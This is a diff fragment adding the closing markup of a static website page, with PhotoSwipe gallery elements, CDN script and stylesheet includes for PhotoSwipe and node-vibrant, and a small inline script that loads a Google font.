+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.313ab02d2f8415261a3718a5b3d0e35b62826b81a7f2c46c8122082f4cba0bcf.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
